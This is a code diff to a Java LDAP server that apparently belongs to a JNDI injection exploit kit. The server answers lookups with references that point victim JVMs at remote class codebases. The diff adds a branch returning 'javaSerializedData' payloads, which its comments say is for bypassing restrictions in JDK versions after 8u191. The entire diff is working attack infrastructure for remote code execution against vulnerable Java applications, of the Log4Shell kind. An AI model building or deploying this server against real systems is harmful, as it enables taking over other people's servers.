@@ -9,9 +9,11 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Base64;
 import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.text.ParseException;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
@@ -24,6 +26,7 @@ import javax.net.ssl.SSLSocketFactory;
 public class LdapServer {
 
   private static final String LDAP_BASE = "dc=example,dc=com";
+  public static byte[] classData;
 
   public static void main(String[] args) {
     run();
@@ -94,9 +97,15 @@ public class LdapServer {
       if (refPos > 0) {
         cbstring = cbstring.substring(0, refPos);
       }
-      e.addAttribute("javaCodeBase", cbstring);
-      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-      e.addAttribute("javaFactory", this.codebase.getRef());
+      if (classData == null) {
+        //todo <= jdk8u191
+        e.addAttribute("javaCodeBase", cbstring);
+        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+        e.addAttribute("javaFactory", this.codebase.getRef());
+      } else {
+        //todo > jdk8u191
+        e.addAttribute("javaSerializedData", classData);
+      }
       result.sendSearchEntry(e);
       result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
     }
